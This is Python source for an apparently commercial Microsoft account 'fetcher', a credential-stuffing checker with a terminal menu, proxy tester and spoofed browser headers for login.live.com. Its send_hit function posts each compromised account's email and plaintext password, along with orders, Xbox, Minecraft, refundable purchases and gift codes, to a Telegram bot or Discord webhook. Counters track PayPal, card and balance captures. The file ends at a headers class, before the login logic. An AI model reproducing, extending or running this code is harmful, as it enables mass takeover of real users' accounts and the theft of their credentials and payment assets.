
import customtkinter as ctk
from tkinter import filedialog, messagebox
from queue import Queue
from user_agent import generate_user_agent
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

#Fixed By TalkNeon
import os
import shutil
import sys
import platform
import re
import time
import json
import uuid
import random
import html
import subprocess
import string
import urllib.parse
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor

if platform.system() == 'Windows':
    import msvcrt
    import ctypes
    from ctypes import wintypes
else:
    msvcrt = None
    ctypes = None
    wintypes = None

try:
    from discord_license_client import DiscordBotLicenseClient
except ImportError:
    print("Warning: discord_license_client not found. License features disabled.")
    class DiscordBotLicenseClient:
        def __init__(self, **kwargs): self.hwid = 'N/A'
        def get_cached_license_info(self): return None
        def get_license_info(self): return None
        def is_licensed(self): return True
        def activate(self, key): return (False, 'Not available')
        def deactivate(self): return None

import requests
import urllib3

try:
    import yaml
except ImportError:
    yaml = None

try:
    import tls_client
except ImportError:
    tls_client = None

try:
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
    from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
except ImportError:
    pass

try:
    from requests_toolbelt import MultipartEncoder
except ImportError:
    MultipartEncoder = None

from rich.align import Align
from rich.box import ROUNDED
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress
from rich.table import Table
from rich.text import Text

urllib3.disable_warnings()
console = Console()

THEME = {
    'start_color': (0, 200, 255),
    'end_color': (0, 100, 200),
    'highlight_bg': (0, 40, 60),
    'highlight_fg': (100, 220, 255),
    'disclaimer_start': (0, 180, 230),
    'disclaimer_end': (0, 150, 255),
    'success_color': (0, 255, 150),
    'error_color': (255, 50, 100),
    'hit_color': (0, 255, 255),
    'custom_color': (0, 180, 255),
    'dead_color': (100, 120, 140),
    'ascii_color': (50, 200, 255),
    'about_color': (0, 220, 255),
    'store_color': (100, 200, 255),
}

DEVELOPMENT_MODE = True
LICENSE_API_URL = ''
LICENSE_API_KEY = ''
LICENSE_PRODUCT_NAME = ''
LICENSE_STORAGE_FOLDER = '.msauth'
license_client = DiscordBotLicenseClient(
    api_url=LICENSE_API_URL,
    api_key=LICENSE_API_KEY,
    product_name=LICENSE_PRODUCT_NAME,
    storage_folder=LICENSE_STORAGE_FOLDER,
)

SFTTAG_URL = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
SETTINGS_FILE = 'settings.json'
DISCLAIMER_LOG_FILE = 'disclaimer.log'
HIT_SENDER_LOG_FILE = 'hit_sender_debug.log'
MINECRAFT_LOG_FILE = 'minecraft_debug.log'
PROMO_DEBUG_LOG_FILE = 'promo_debug.log'

SETTINGS = {
    'proxy': None,
    'checker_threads': 25,
    'proxy_threads': 100,
    'promo_threads': 10,
    'enable_hypixel_api': False,
    'enable_file_logging': False,
    'hit_sender': {
        'enabled': 'None',
        'telegram_token': '',
        'telegram_chat_id': '',
        'discord_webhook': None,
    },
}

PURCHASE_FLIGHTS = []

TEST_URL = 'https://httpbin.org/ip'

BANNER = r'''
 ▄▄▄       ███▄    █  ▒█████   ███▄ ▄███▓ █    ██   ██████      █████▒▓█████▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  
▒████▄     ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒ ██  ▓██▒▒██    ▒    ▓██   ▒ ▓█   ▀▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░▓██  ▒██░░ ▓██▄      ▒████ ░ ▒███  ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ ▓▓█  ░██░  ▒   ██▒   ░▓█▒  ░ ▒▓█  ▄░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  
 ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒▒▒█████▓ ▒██████▒▒   ░▒█░    ░▒████▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒
 ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░    ▒ ░    ░░ ▒░ ░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░░░▒░ ░ ░ ░ ░▒  ░ ░    ░       ░ ░  ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒  ░      ░    ░░░ ░ ░ ░  ░  ░      ░ ░       ░    ░      ░         ░  ░░ ░   ░     ░░   ░ 
      ░  ░         ░     ░ ░         ░      ░           ░                ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     
'''

ADDITIONAL_INFO = 'Made by @Nigrofr | Microsoft Fetcher 2.0'
STORE_INFO = '@ParadoxCloudz'
SCAM_WARNING = 'Warning - Only legit from official seller. Anything else = scam!'

WARNING_ASCII = r'''
          .-.
           | \
           | /\
      ,___| |  \
     / ___( )   L
    '-`   | |   |
          | |   F
          | |  /
          | |
 ANU      | |
      ____|_|____
     [___________]
,,,,,/,,,,,,,,,,,,\,,,,,,,,,,,,,
'''

OWL_ASCII = r'''
  ,___,
  (O,O)
  (   )
--"-"---
'''


class Key:
    UP = 'UP'
    DOWN = 'DOWN'
    LEFT = 'LEFT'
    RIGHT = 'RIGHT'
    ENTER = 'ENTER'
    UNKNOWN = 'UNKNOWN'


UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'


def setup_terminal():
    """Setup terminal for raw input on Unix/Linux systems."""
    if platform.system() != 'Windows':
        import termios
        import tty
        return (termios, tty)
    else:
        return (None, None)


def get_unix_key(termios_module, tty_module):
    """Get a key press on Unix/Linux systems."""
    import sys
    import termios
    import tty
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
        if ch == '\x1b':
            ch = sys.stdin.read(2)
            if ch == '[A':
                return Key.UP
            elif ch == '[B':
                return Key.DOWN
            elif ch == '[D':
                return Key.LEFT
            elif ch == '[C':
                return Key.RIGHT
            else:
                return Key.UNKNOWN
        elif ch in ['\r', '\n']:
            return Key.ENTER
        else:
            return ch.lower()
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)


def get_key():
    """Get a key press cross-platform."""
    if platform.system() == 'Windows':
        if msvcrt:
            key = msvcrt.getch()
            if key == b'\xe0' or key == b'\x00':
                key2 = msvcrt.getch()
                if key2 == b'H':
                    return Key.UP
                elif key2 == b'P':
                    return Key.DOWN
                elif key2 == b'K':
                    return Key.LEFT
                elif key2 == b'M':
                    return Key.RIGHT
                else:
                    return Key.UNKNOWN
            elif key == b'\r':
                return Key.ENTER
            else:
                return key.decode('utf-8', errors='ignore').lower()
    else:
        termios_mod, tty_mod = setup_terminal()
        if termios_mod and tty_mod:
            return get_unix_key(termios_mod, tty_mod)
    return Key.UNKNOWN


def listen_for_cancel_key(cancel_event, stop_listening):
    """Listen for 'c' key press in a separate thread to set cancel_event."""
    if platform.system() == 'Windows':
        while not stop_listening.is_set():
            if msvcrt and msvcrt.kbhit():
                key = msvcrt.getch()
                if key.lower() == b'c':
                    cancel_event.set()
            time.sleep(0.05)
    else:
        import termios
        import tty
        import select
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setcbreak(fd)
            while not stop_listening.is_set():
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    ch = sys.stdin.read(1)
                    if ch.lower() == 'c':
                        cancel_event.set()
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)


def check_disclaimer_accepted():
    if not os.path.exists(DISCLAIMER_LOG_FILE):
        return False
    try:
        with open(DISCLAIMER_LOG_FILE, 'r') as f:
            return f.read().strip() == 'accepted'
    except IOError:
        return False


def write_disclaimer_acceptance():
    try:
        with open(DISCLAIMER_LOG_FILE, 'w') as f:
            f.write('accepted')
    except IOError as e:
        print(f'Could not write to disclaimer log: {e}')


def get_windows_version():
    if platform.system() != 'Windows':
        return None
    else:
        version = sys.getwindowsversion()
        return {'major': version.major, 'build': version.build}


def open_file_dialog(title='Select a File'):
    if platform.system() != 'Windows' or not ctypes:
        return input(f'[{title}] Please enter the full path to your file: ')
    else:
        class OPENFILENAME(ctypes.Structure):
            _fields_ = [
                ('lStructSize', wintypes.DWORD),
                ('hwndOwner', wintypes.HWND),
                ('hInstance', wintypes.HINSTANCE),
                ('lpstrFilter', wintypes.LPCWSTR),
                ('lpstrCustomFilter', wintypes.LPCWSTR),
                ('nMaxCustFilter', wintypes.DWORD),
                ('nFilterIndex', wintypes.DWORD),
                ('lpstrFile', wintypes.LPCWSTR),
                ('nMaxFile', wintypes.DWORD),
                ('lpstrFileTitle', wintypes.LPCWSTR),
                ('nMaxFileTitle', wintypes.DWORD),
                ('lpstrInitialDir', wintypes.LPCWSTR),
                ('lpstrTitle', wintypes.LPCWSTR),
                ('Flags', wintypes.DWORD),
                ('nFileOffset', wintypes.WORD),
                ('nFileExtension', wintypes.WORD),
                ('lpstrDefExt', wintypes.LPCWSTR),
                ('lCustData', wintypes.LPARAM),
                ('lpfnHook', wintypes.LPVOID),
                ('lpTemplateName', wintypes.LPCWSTR),
            ]

        ofn = OPENFILENAME()
        file_path_buffer = ctypes.create_unicode_buffer(260)
        ofn.lStructSize = ctypes.sizeof(OPENFILENAME)
        ofn.lpstrFile = ctypes.cast(file_path_buffer, wintypes.LPCWSTR)
        ofn.nMaxFile = 260
        ofn.lpstrFilter = 'Text Files (*.txt)\x00*.txt\x00All Files (*.*)\x00*.*\x00'
        ofn.lpstrTitle = title
        ofn.Flags = 6144
        if ctypes.windll.comdlg32.GetOpenFileNameW(ctypes.byref(ofn)):
            return file_path_buffer.value
        return None


def parse_proxy(proxy_string):
    """Parses a proxy string from various formats including ip:port and user:pass@host:port."""
    proxy_string = proxy_string.strip()
    if proxy_string.startswith('http://'):
        proxy_string = proxy_string[7:]
    elif proxy_string.startswith('https://'):
        proxy_string = proxy_string[8:]

    if '@' in proxy_string:
        try:
            creds, loc = proxy_string.rsplit('@', 1)
            host, port = loc.rsplit(':', 1)
            user, pwd = creds.rsplit(':', 1)
            return {'host': host, 'port': port, 'user': user, 'pass': pwd}
        except (ValueError, IndexError):
            return {'error': 'Invalid format for user:pass@host:port'}
    else:
        parts = proxy_string.split(':')
        if len(parts) == 2:
            try:
                host, port = parts
                return {'host': host, 'port': port, 'user': None, 'pass': None}
            except (ValueError, IndexError):
                return {'error': 'Invalid format for host:port'}
        elif len(parts) == 4:
            try:
                host, port, user, pwd = parts
                return {'host': host, 'port': port, 'user': user, 'pass': pwd}
            except (ValueError, IndexError):
                return {'error': 'Invalid format for host:port:user:pass'}
        else:
            return {'error': 'Unrecognized proxy format'}


def save_settings():
    try:
        with open(SETTINGS_FILE, 'w') as f:
            json.dump(SETTINGS, f, indent=4)
    except Exception:
        pass


def load_settings():
    global SETTINGS
    try:
        if os.path.exists(SETTINGS_FILE):
            with open(SETTINGS_FILE, 'r') as f:
                loaded = json.load(f)
                SETTINGS.update(loaded)
    except Exception:
        pass


def write_to_file_no_duplicates(file_path, content):
    try:
        os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
        existing = set()
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                existing = set(line.strip() for line in f)
        if content.strip() not in existing:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(content.strip() + '\n')
    except FileNotFoundError:
        pass
    except Exception:
        pass


def remove_content(file_path: str, line_to_remove: str):
    """Remove a specific line from a file"""
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
        lines = [line for line in lines if line.strip() != line_to_remove.strip()]
        with open(file_path, 'w') as file:
            file.writelines(lines)
    except Exception:
        pass


def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')


def set_title(title):
    if os.name == 'nt':
        os.system(f'title {title}')
    else:
        sys.stdout.write(f'\033]2;{title}\007')


def generate_gradient(start, end, length):
    if length <= 0:
        return []
    d = length - 1 if length > 1 else 1
    return [tuple(int(start[i] + (end[i] - start[i]) * j / d) for i in range(3)) for j in range(length)]


def colorize_text(text, gradient):
    colored = ''
    grad_idx = 0
    for char in text:
        if not char.isspace() and grad_idx < len(gradient):
            r, g, b = gradient[grad_idx]
            colored += f'\033[38;2;{r};{g};{b}m{char}'
            grad_idx += 1
        else:
            colored += char
    return colored + '\033[0m'


def center_multiline(text):
    width = shutil.get_terminal_size().columns
    lines = text.split('\n')
    return '\n'.join(line.center(width) for line in lines)


def display_colored_text(text, start_color, end_color):
    centered = center_multiline(text)
    non_space = ''.join(c for c in text if not c.isspace())
    if non_space:
        gradient = generate_gradient(start_color, end_color, len(non_space))
        print(colorize_text(centered, gradient))
    else:
        print(centered)


def gradient_line(start, end, length, char='═'):
    line = ''
    grad = generate_gradient(start, end, length)
    for r, g, b in grad:
        line += f'\033[38;2;{r};{g};{b}m{char}'
    return line + '\033[0m'


ANSI_ESCAPE = re.compile(r'\x1b\[([0-9;]+)m')


def visible_len(text):
    return len(ANSI_ESCAPE.sub('', text))


def display_menu(title, options, selected, frame, is_fancy):
    clear_terminal()
    start_color, end_color = THEME['start_color'], THEME['end_color']
    display_colored_text(BANNER + '\n' + ADDITIONAL_INFO, start_color, end_color)
    display_colored_text(STORE_INFO, THEME['store_color'], THEME['store_color'])
    display_colored_text(SCAM_WARNING, THEME['error_color'], THEME['error_color'])
    print('\n')
    display_colored_text(title, start_color, end_color)
    print('\n\n')
    width = shutil.get_terminal_size().columns
    start_rgb, end_rgb = THEME['start_color'], THEME['end_color']
    start_color_code = f'\033[38;2;{start_rgb[0]};{start_rgb[1]};{start_rgb[2]}m'
    end_color_code = f'\033[38;2;{end_rgb[0]};{end_rgb[1]};{end_rgb[2]}m'
    reset_code = '\033[0m'
    raw_option_lines = [f' {"▶" if i == selected else " "} {opt}' for i, opt in enumerate(options)]
    menu_width = max(40, max(len(line) for line in raw_option_lines) + 4)
    inner = menu_width - 2
    margin = (width - menu_width) // 2
    vertical_gradient = generate_gradient(start_color, end_color, len(options))

    if is_fancy:
        print(f'{" " * margin}{start_color_code}╔{reset_code}{gradient_line(start_color, end_color, inner)}{end_color_code}╗{reset_code}')

    for i, opt in enumerate(options):
        if i == selected:
            arrow = '▶' if frame % 2 == 0 else '>'
            text = f' {arrow} {opt}'
            bg, fg = THEME['highlight_bg'], THEME['highlight_fg']
            colored = f'\033[48;2;{bg[0]};{bg[1]};{bg[2]}m\033[38;2;{fg[0]};{fg[1]};{fg[2]}m{text}\033[0m'
        else:
            text = f'  {opt}'
            colored = text
        padding = ' ' * max(0, inner - visible_len(colored))
        line_content = f'{colored}{padding}'
        if is_fancy:
            r, g, b = vertical_gradient[i]
            border_color = f'\033[38;2;{r};{g};{b}m'
            print(f'{" " * margin}{border_color}║\033[0m{line_content}{border_color}║\033[0m')
        else:
            print(f'{" " * margin} {line_content} ')

    if is_fancy:
        print(f'{" " * margin}{start_color_code}╚{reset_code}{gradient_line(start_color, end_color, inner)}{end_color_code}╝{reset_code}')
    print('\n\n' + center_multiline('Use UP/DOWN arrows to navigate, ENTER to select.'))


def get_user_input(prompt, is_password=False):
    width = shutil.get_terminal_size().columns
    centered_prompt = ' ' * ((width - 2) // 2) + '> '
    print(centered_prompt, end='', flush=True)
    if is_password:
        import getpass
        sys.stdout.write('\033[?25l')
        response = getpass.getpass(prompt='')
        sys.stdout.write('\033[?25h')
    else:
        response = input()
    sys.stdout.write('\033[?25l')
    return response


def show_message(message, color=THEME['success_color'], vertical_center=False):
    clear_terminal()
    if vertical_center:
        try:
            height = shutil.get_terminal_size().lines
            padding = (height - (len(message.strip().split('\n')) + 3)) // 2
            if padding > 0:
                print('\n' * padding)
        except OSError:
            pass
    display_colored_text(message, color, color)
    print('\n\n' + '(Press any key to return)'.center(shutil.get_terminal_size().columns))
    get_key()


def run_yes_no_prompt(prompt):
    selected = 0
    options = ['Yes', 'No']
    while True:
        clear_terminal()
        display_colored_text(prompt, THEME['start_color'], THEME['end_color'])
        print('\n')
        parts = [f'\033[7m {opt} \033[0m' if i == selected else f' {opt} ' for i, opt in enumerate(options)]
        print(center_multiline('  '.join(parts)))
        key = get_key()
        if key in (Key.LEFT, Key.RIGHT):
            selected = 1 - selected
        elif key == Key.ENTER:
            return selected == 0


def run_start_cancel_prompt(prompt):
    selected = 0
    options = ['Start', 'Cancel']
    while True:
        clear_terminal()
        display_colored_text(prompt, THEME['start_color'], THEME['end_color'])
        print('\n')
        parts = [f'\033[7m {opt} \033[0m' if i == selected else f' {opt} ' for i, opt in enumerate(options)]
        print(center_multiline('  '.join(parts)))
        key = get_key()
        if key in (Key.LEFT, Key.RIGHT):
            selected = 1 - selected
        elif key == Key.ENTER:
            return selected == 0


lock = threading.Lock()
tested_proxies_count = 0
working_proxies, dead_proxies = [], []


def test_single_proxy(proxy_string, cancel_event):
    global tested_proxies_count
    if cancel_event.is_set():
        return
    parsed = parse_proxy(proxy_string)
    if 'error' in parsed:
        with lock:
            dead_proxies.append({'proxy': proxy_string, 'reason': 'Invalid format'})
            tested_proxies_count += 1
        return
    proxy_url = 'http://'
    if parsed.get('user') and parsed.get('pass'):
        proxy_url += f'{parsed["user"]}:{parsed["pass"]}@'
    proxy_url += f'{parsed["host"]}:{parsed["port"]}'
    proxies = {'http': proxy_url, 'https': proxy_url}
    start_time = time.time()
    try:
        response = requests.get(TEST_URL, proxies=proxies, timeout=10)
        response.raise_for_status()
        latency = (time.time() - start_time) * 1000
        with lock:
            working_proxies.append({'proxy': proxy_string, 'latency': latency})
            tested_proxies_count += 1
    except requests.exceptions.RequestException as e:
        with lock:
            dead_proxies.append({'proxy': proxy_string, 'reason': str(e.__class__.__name__)})
            tested_proxies_count += 1


def to_rgb_str(color_tuple):
    return f'rgb({color_tuple[0]},{color_tuple[1]},{color_tuple[2]})'


def generate_proxy_test_table(total_proxies, cancel_event):
    s_working = f'bold {to_rgb_str(THEME["success_color"])}'
    s_dead = f'bold {to_rgb_str(THEME["error_color"])}'
    s_tested = f'bold {to_rgb_str(THEME["disclaimer_end"])}'
    s_border = to_rgb_str(THEME['custom_color'])
    stats_content = f'[{s_working}]WORKING[/] : [{s_working}]{len(working_proxies)}[/]\n[{s_dead}]DEAD[/]    : [{s_dead}]{len(dead_proxies)}[/]\n[{s_tested}]TESTED[/]  : [{s_tested}]{tested_proxies_count}/{total_proxies}[/]'
    results_table = Table(box=ROUNDED, expand=True, show_header=False, title='[bold]Latest Results[/]')
    results_table.add_column()
    latest_results = (working_proxies + dead_proxies)[-5:]
    if not latest_results:
        results_table.add_row('Testing...')
    else:
        for res in latest_results:
            if 'latency' in res:
                results_table.add_row(f'[{s_working}]WORKING[/{s_working}] {res["proxy"]} ({res["latency"]:.0f}ms)')
            else:
                results_table.add_row(f'[{s_dead}]DEAD[/{s_dead}]    {res["proxy"]} ({res["reason"]})')
    main_table = Table.grid(expand=True)
    main_table.add_column()
    main_table.add_row(Panel(stats_content, title='[bold]Proxy Tester[/]', border_style=s_border))
    main_table.add_row(Panel(results_table, border_style=s_border))
    cancel_text = Text('Cancelling...', justify='center', style=f'bold {to_rgb_str(THEME["error_color"])}') if cancel_event.is_set() else Text("Press 'C' to Cancel", justify='center', style='dim')
    main_table.add_row(Panel(cancel_text, border_style=s_border, padding=(0, 1)))
    return main_table


def run_proxy_tester():
    global dead_proxies, working_proxies, tested_proxies_count
    proxies_to_test = SETTINGS.get('proxy')
    if not proxies_to_test:
        show_message('No proxies loaded. Please add proxies in settings first.', THEME['error_color'])
        return
    if isinstance(proxies_to_test, str):
        proxies_to_test = [proxies_to_test]
    tested_proxies_count, working_proxies, dead_proxies = 0, [], []
    cancel_event_local = threading.Event()
    stop_listening = threading.Event()
    listener_thread = threading.Thread(target=listen_for_cancel_key, args=(cancel_event_local, stop_listening), daemon=True)
    listener_thread.start()
    clear_terminal()
    try:
        with Live(generate_proxy_test_table(len(proxies_to_test), cancel_event_local), console=console, screen=False, auto_refresh=False) as live:
            with ThreadPoolExecutor(max_workers=SETTINGS.get('proxy_threads', 100)) as executor:
                for proxy in proxies_to_test:
                    if cancel_event_local.is_set():
                        break
                    executor.submit(test_single_proxy, proxy, cancel_event_local)
                while tested_proxies_count < len(proxies_to_test):
                    if cancel_event_local.is_set():
                        break
                    live.update(generate_proxy_test_table(len(proxies_to_test), cancel_event_local), refresh=True)
                    time.sleep(0.1)
            live.update(generate_proxy_test_table(len(proxies_to_test), cancel_event_local), refresh=True)
    except Exception:
        pass
    stop_listening.set()
    if not cancel_event_local.is_set() and working_proxies:
        if run_yes_no_prompt(f'{len(working_proxies)} working proxies found. Save them to a file?'):
            folder_path = 'proxies'
            os.makedirs(folder_path, exist_ok=True)
            file_path = os.path.join(folder_path, 'working_proxies.txt')
            with open(file_path, 'w') as f:
                for p in working_proxies:
                    f.write(p['proxy'] + '\n')
            show_message(f'Working proxies saved to:\n{file_path}')
    elif cancel_event_local.is_set():
        show_message('Proxy test cancelled.', THEME['error_color'])


def get_log_path(log_filename):
    """Get the full path for a log file, considering results_base_folder"""
    if results_base_folder:
        return os.path.join(results_base_folder, log_filename)
    return log_filename


def log_activity(log_file, message):
    """Appends a timestamped log message to a specified log file."""
    try:
        log_file = get_log_path(log_file)
        os.makedirs(os.path.dirname(log_file) if os.path.dirname(log_file) else '.', exist_ok=True)
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}] {message}\n')
    except IOError:
        pass


def send_hit(capture_details):
    sender_config = SETTINGS.get('hit_sender', {})
    if not sender_config or sender_config.get('enabled', 'None') == 'None':
        return
    email, password = capture_details.get('combo', ':').split(':', 1)
    esc_email = html.escape(email)
    esc_password = html.escape(password)
    orders = capture_details.get('orders', 0)
    xbox = capture_details.get('xbox', 'N/A')
    minecraft = capture_details.get('minecraft', 'N/A')
    refundable = capture_details.get('refundable', 0)
    gift_codes = capture_details.get('gift_codes', 0)

    h = '<a href="https://anomus.mysellauth.com">[ϟ]</a>'
    message = (
        f'✅   <b>MICROSOFT HIT DETECTED</b>   ✅\n'
        f'━━━━━━━━━━━━━━━\n'
        f'{h} 📧 Email         ⌁ {esc_email}\n'
        f'{h} 🔑 Password      ⌁ {esc_password}\n'
        f'{h} 🧩 Module         ⌁ Microsoft Fetcher v2.0 | AnomusService\n'
        f'━━━━━━━━━━━━━━\n'
        f'{h} 📦 Orders        ⌁ {orders}\n'
        f'{h} 🎮 Xbox Game Pass ⌁ {xbox}\n'
        f'{h} ⛏️  Minecraft     ⌁ {minecraft}\n'
        f'{h} 💰 Refundable     ⌁ {refundable}\n'
        f'{h} 🎁 Gift Codes    ⌁ {gift_codes}\n'
        f'━━━━━━━━━━━━━━\n'
        f'🔮 MADE WITH ⚡ BY @anomus.ly'
    )

    try:
        if sender_config['enabled'] == 'Telegram':
            token = sender_config.get('telegram_token')
            chat_id = sender_config.get('telegram_chat_id')
            if token and chat_id:
                url = f'https://api.telegram.org/bot{token}/sendMessage'
                payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}
                log_message_base = f'Telegram for {email}'
                log_activity(HIT_SENDER_LOG_FILE, f'Attempting to send hit via {log_message_base}.')
                response = requests.post(url, json=payload, timeout=10)
                response.raise_for_status()
                log_activity(HIT_SENDER_LOG_FILE, f'Successfully sent hit via {log_message_base}. Status Code: {response.status_code}')

        elif sender_config['enabled'] == 'Discord':
            webhook_url = sender_config.get('discord_webhook')
            if webhook_url:
                plain_message = re.sub('<[^<]+?>', '', message)
                payload = {'content': f'```{plain_message}```'}
                log_message_base = f'Discord for {email}'
                log_activity(HIT_SENDER_LOG_FILE, f'Attempting to send hit via {log_message_base}.')
                response = requests.post(webhook_url, json=payload, timeout=10)
                response.raise_for_status()
                log_activity(HIT_SENDER_LOG_FILE, f'Successfully sent hit via {log_message_base}. Status Code: {response.status_code}')
    except requests.RequestException as e:
        log_activity(HIT_SENDER_LOG_FILE, f'Failed to send hit. Error: {e}')


# ===== Global State =====
ms_hits, ms_valid, ms_dead, ms_errors, ms_checked_count = [], [], [], [], 0
ms_minecraft_count, ms_codes_count, ms_refundable_count = 0, 0, 0
ms_codes_valid_count = 0
ms_paypal_count, ms_cards_count, ms_balance_count = 0, 0, 0
ms_minecraft_mfa, ms_minecraft_sfa = 0, 0
ms_total_skyblock_coins = 0.0
ms_total_bedwars_stars = 0.0
ms_hypixel_count = 0
ms_promo_count = 0
ms_purchase_count = 0
ms_purchased_items = 0
ms_start_time = 0
ms_captures = []
ms_subscriptions_count = 0
ms_rewards_count = 0
ms_total_rewards_points = 0
live_save_folder = None
results_base_folder = ''
cancel_event = threading.Event()
request_exceptions = (requests.exceptions.SSLError, requests.exceptions.ProxyError, requests.exceptions.Timeout)


class Headers:
    default = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'document', 'Accept-Encoding': 'identity', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Sec-GPC': '1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': UA}
    login = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://login.live.com', 'Referer': 'https://login.live.com/', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Sec-GPC': '1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': UA}
    privacy = {'authority': 'privacynotice.account.microsoft.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://login.live.com', 'referer': 'https://login.live.com/', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'cross-site', 'sec-gpc': '1', 'upgrade-insecure-requests': '1', 'user-agent': UA}
    precord = {'authority': 'privacynotice.account.microsoft.com', 'accept': 'application/json, text/plain, */*', 'accept-language': 'en-US,en;q=0.7', 'origin': 'https://privacynotice.account.microsoft.com', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'sec-gpc': '1', 'user-agent': UA}
    notice = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.6', 'Connection': 'keep-alive', 'Referer': 'https://privacynotice.account.microsoft.com/', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-User': '?1', 'Sec-GPC': '1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': UA}
    midauth = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://login.live.com', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Sec-GPC': '1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': UA}
    midauth2 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.8', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Origin': 'https://login.live.com', 'Referer': 'https://login.live.com/', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'cross-site', 'Sec-GPC': '1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': UA}
    payment = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.6', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Referer': 'https://login.live.com/', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'cross-site', 'Sec-GPC': '1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': UA}
